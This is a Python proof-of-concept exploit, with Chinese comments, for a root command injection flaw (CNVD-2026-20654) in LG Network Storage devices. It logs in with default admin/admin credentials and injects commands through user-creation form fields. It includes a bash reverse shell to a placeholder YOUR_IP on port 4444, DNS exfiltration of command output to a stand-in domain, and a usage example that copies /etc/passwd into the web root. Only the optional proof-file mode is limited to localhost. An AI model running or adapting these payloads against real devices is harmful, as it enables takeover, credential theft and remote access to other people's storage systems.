#!/usr/bin/env python3
"""
CNVD-2026-20654 LG Network Storage 命令注入漏洞 PoC
支持两个注入点：txtUserPassword 和 txtUserID
"""

import requests
import sys
import argparse
import ipaddress
import os
import re
import secrets
import shlex
from urllib.parse import quote, urlparse

requests.packages.urllib3.disable_warnings()

# 禁用代理
os.environ['NO_PROXY'] = '*'
os.environ['no_proxy'] = '*'


def is_loopback_target(target_url):
    """证明文件模式只允许访问本机回环地址。"""
    host = urlparse(target_url).hostname
    if host == "localhost":
        return True
    try:
        return ipaddress.ip_address(host).is_loopback
    except ValueError:
        return False


def build_proof_command(target_url, language, proof_file):
    """生成只用于本地实验的、可通过 HTTP 校验的证明文件命令。"""
    if not is_loopback_target(target_url):
        raise ValueError("--proof-file 只允许用于 localhost/127.0.0.1/::1")

    web_root = f"/var/www/{language}/"
    if not proof_file.startswith(web_root):
        raise ValueError(f"证明文件必须位于 {web_root} 下")

    relative_path = proof_file[len(web_root):]
    if not re.fullmatch(r"[A-Za-z0-9_.-]+", relative_path):
        raise ValueError("证明文件名只能包含字母、数字、点、下划线和短横线")

    marker = f"CNVD_RCE_PROOF_{secrets.token_hex(8)}"
    # 在 sudo shell 中同时写入唯一标记和 uid；uid=0 可证明是 root 上下文。
    proof_script = (
        f"printf '%s uid=%s\\n' {shlex.quote(marker)} \"$(id -u)\" "
        f"> {shlex.quote(proof_file)}"
    )
    command = f"sudo sh -c {shlex.quote(proof_script)}"
    proof_url = f"{target_url.rstrip('/')}/{language}/{quote(relative_path)}"
    return command, marker, proof_url


def login(target_url, username, password, language="en"):
    """登录 LG NAS 获取有效会话"""
    print(f"[*] 步骤 1: 登录到 {target_url}")
    print(f"[*] 用户名: {username}")

    login_url = f"{target_url.rstrip('/')}/{language}/php/login_check.php"

    session = requests.Session()
    session.trust_env = False
    session.proxies = {}

    payload = {
        "op_mode": "login",
        "id": username,
        "password": password,
        "mobile": "false"
    }

    try:
        response = session.post(login_url, data=payload, verify=False, timeout=10)
        # 老版本页面可能带 UTF-8 BOM，先去掉再判断响应。
        response_text = response.text.lstrip("\ufeff").strip()
        print(f"[*] 登录响应: {response_text}")

        if response_text.startswith("OK"):
            phpsessid = session.cookies.get('PHPSESSID')
            if phpsessid:
                print(f"[+] 登录成功！")
                print(f"[+] PHPSESSID: {phpsessid}")
                return session, phpsessid
            else:
                print("[-] 登录响应 OK 但未获取到会话 Cookie")
                return None, None
        elif "NG:NO USER" in response_text:
            print(f"[-] 登录失败：用户 '{username}' 不存在")
            return None, None
        elif "NG:WRONG PASSWORD" in response_text:
            print(f"[-] 登录失败：密码错误")
            return None, None
        else:
            print(f"[-] 登录失败：{response_text}")
            return None, None

    except requests.exceptions.RequestException as e:
        print(f"[-] 登录请求失败: {e}")
        return None, None


def exploit(target_url, session_id, command="whoami", method="custom",
            injection_point="password", language="en", delay=5,
            proof_file=None):
    """
    执行命令注入利用

    Args:
        injection_point: "password" 或 "userid"
        language: Web UI 语言目录，例如 "en" 或 "fr"
        delay: blind 模式的 sleep 秒数
        proof_file: 本地实验中写入并通过 HTTP 校验的证明文件路径
    """
    proof_marker = None
    proof_url = None
    if proof_file:
        try:
            command, proof_marker, proof_url = build_proof_command(
                target_url, language, proof_file
            )
        except ValueError as exc:
            print(f"[-] 证明文件参数无效: {exc}")
            return False
        if method != "custom":
            print("[!] --proof-file 使用 custom 模式，已忽略其他 method")
        method = "custom"

    print("=" * 70)
    print("CNVD-2026-20654 LG NAS 命令注入漏洞 PoC")
    print("=" * 70)
    print(f"[*] 目标: {target_url}")
    print(f"[*] 会话: {session_id}")
    print(f"[*] 命令: {command}")
    print(f"[*] 方法: {method}")
    print(f"[*] 注入点: {injection_point}")
    print()

    session = requests.Session()
    session.trust_env = False
    session.proxies = {}

    if session_id:
        session.cookies.set('PHPSESSID', session_id)

    if not session_id:
        print("[-] 错误: 需要有效的 PHPSESSID")
        return False

    exploit_url = f"{target_url.rstrip('/')}/{language}/php/share_set_user_info.php"

    # 构造 payload
    if method == "blind":
        payload_cmd = f"$(sleep {int(delay)})test"
        print(f"[*] 使用时间盲注，预期延迟 {int(delay)} 秒")
    elif method == "dns":
        payload_cmd = f"$(nslookup `{command}`.your-domain.com)test"
        print("[*] 使用 DNS 外带")
    elif method == "reverse":
        payload_cmd = f"$(bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1')test"
        print("[*] 使用反弹 shell")
    else:
        payload_cmd = f"$({command})test"

    # 根据注入点构造不同的 payload
    if injection_point == "userid":
        # 使用 txtUserID 注入点（第 78 行）
        if method == "blind":
            userid_payload = f"|sleep {int(delay)}"
        elif method == "dns":
            userid_payload = f"|nslookup `{command}`.your-domain.com"
        elif method == "reverse":
            userid_payload = "|bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
        else:
            userid_payload = f"|{command}"

        payload = {
            "txtMode": "add",
            "txtUserID": userid_payload,  # 使用管道符注入
            "txtUserPassword": "testpass",
            "txtUserPasswordChanged": "false",
            "txtUserName": "Test",
            "txtUserMail": "test@test.com",
            "txtUserDesc": "test"
        }
        print(f"[*] Payload: txtUserID={userid_payload}")
    else:
        # 使用 txtUserPassword 注入点（第 28 行）
        payload = {
            "txtMode": "add",
            "txtUserID": "testuser",
            "txtUserPassword": payload_cmd,
            "txtUserPasswordChanged": "true",
            "txtUserName": "Test User",
            "txtUserMail": "test@example.com",
            "txtUserDesc": "Test",
            "chkMailNotification": "off"
        }
        print(f"[*] Payload: txtUserPassword={payload_cmd}")

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Cookie": f"lgnas_language={language}; PHPSESSID={session_id}",
        "Connection": "close"
    }

    print()

    try:
        import time
        start_time = time.time()

        response = session.post(
            exploit_url,
            data=payload,
            headers=headers,
            verify=False,
            timeout=15
        )

        elapsed_time = time.time() - start_time

        print(f"[+] 状态码: {response.status_code}")
        print(f"[+] 响应时间: {elapsed_time:.2f} 秒")
        print(f"[+] 响应内容: {response.text[:200]}")

        response_text = response.text.lstrip("\ufeff").strip()

        if response_text == "-99":
            print("\n[-] 会话无效或已过期")
            return False

        if response.status_code == 502:
            print("\n[-] 502 错误：可能是会话验证问题")
            return False

        if proof_file:
            try:
                proof_response = session.get(proof_url, verify=False, timeout=5)
                proof_text = proof_response.text.lstrip("\ufeff").strip()
            except requests.exceptions.RequestException as exc:
                print(f"\n[!] 证明文件请求失败: {exc}")
                return None

            if proof_response.status_code == 200 and proof_marker in proof_text:
                print(f"\n[+] 证明文件读取成功: {proof_url}")
                print(f"[+] 标记: {proof_marker}")
                print(f"[+] 文件内容: {proof_text[:200]}")
                if "uid=0" in proof_text:
                    print("[+] uid=0，已确认命令在 root 上下文执行")
                else:
                    print("[!] 文件写入已确认，但响应中未发现 uid=0")
                return True

            print("\n[!] 请求已发送，但证明文件未读取到唯一标记")
            print(f"[!] 文件响应: HTTP {proof_response.status_code}")
            return None

        if method == "blind" and elapsed_time >= max(1, delay - 0.5):
            print("\n[+] 漏洞确认！命令执行成功（响应延迟）")
            return True
        elif method == "blind":
            print("\n[-] 未达到预期延迟，不能确认命令执行")
            return False
        elif response.status_code == 200:
            print("\n[!] 请求已发送，但该模式没有可靠回显；HTTP 200 不能确认 RCE")
            return None
        else:
            print("\n[-] 利用可能失败")
            return False

    except requests.exceptions.Timeout:
        print("[-] 请求超时，不能据此确认命令执行")
        return None
    except requests.exceptions.RequestException as e:
        print(f"[-] 请求失败: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="CNVD-2026-20654 LG NAS 命令注入漏洞 PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例用法:
  # 自动登录（txtUserPassword 注入点）
  python3 poc.py --target http://192.168.1.1:8000 --username admin --password admin --command "id"

  # 使用 txtUserID 注入点（支持文件重定向）
  python3 poc.py --target http://192.168.1.1:8000 --username admin --password admin --command "cat /etc/passwd > /var/www/en/zbx.txt" --injection-point userid

  # 使用已有会话
  python3 poc.py --target http://192.168.1.1:8000 --session YOUR_PHPSESSID --command "id"

  # 本地隔离环境：写入并通过 HTTP 校验 RCE 证明文件
  python3 poc.py --target http://127.0.0.1:8000 --username admin --password admin \
    --injection-point userid --proof-file /var/www/en/cnvd_rce_proof.txt

注意:
  - txtUserPassword 注入点：命令在 $() 中执行，文件重定向可能不工作
  - txtUserID 注入点：使用管道符 |，支持文件重定向
  - 命令以 root 权限执行（sudo）
        """
    )

    parser.add_argument("--target", required=True, help="目标 URL")
    parser.add_argument("--username", default="admin", help="登录用户名（默认: admin）")
    parser.add_argument("--password", default="admin", help="登录密码（默认: admin）")
    parser.add_argument("--session", help="使用已有的 PHPSESSID（跳过登录）")
    parser.add_argument("--command", default="whoami", help="要执行的命令（默认: whoami）")
    parser.add_argument("--method",
                       choices=["blind", "dns", "reverse", "custom"],
                       default="custom",
                       help="利用方法（默认: custom）")
    parser.add_argument("--injection-point",
                       choices=["password", "userid"],
                       default="password",
                       help="注入点选择（默认: password）")
    parser.add_argument("--lang",
                       choices=["en", "fr"],
                       default="en",
                       help="Web UI 语言路径（默认: en）")
    parser.add_argument("--delay",
                       type=int,
                       default=5,
                       help="blind 模式的延迟秒数（默认: 5）")
    parser.add_argument("--proof-file",
                       help="仅限本地回环目标：写入并通过 HTTP 校验证明文件")

    args = parser.parse_args()

    if args.proof_file:
        try:
            # 只做本地参数校验；真正生成的标记会在 exploit() 中重新生成。
            build_proof_command(args.target, args.lang, args.proof_file)
        except ValueError as exc:
            print(f"[-] 证明文件参数无效: {exc}")
            sys.exit(1)

    if args.session:
        print(f"[*] 使用提供的会话: {args.session}")
        session_id = args.session
    else:
        _, session_id = login(args.target, args.username, args.password, args.lang)
        if not session_id:
            print("\n[-] 无法继续，登录失败")
            sys.exit(1)

    result = exploit(
        args.target,
        session_id,
        args.command,
        args.method,
        args.injection_point,
        args.lang,
        args.delay,
        args.proof_file,
    )

    # 0=确认成功，1=失败，2=请求成功但没有足够证据确认 RCE。
    if result is True:
        sys.exit(0)
    if result is None:
        sys.exit(2)
    sys.exit(1)


if __name__ == "__main__":
    main()
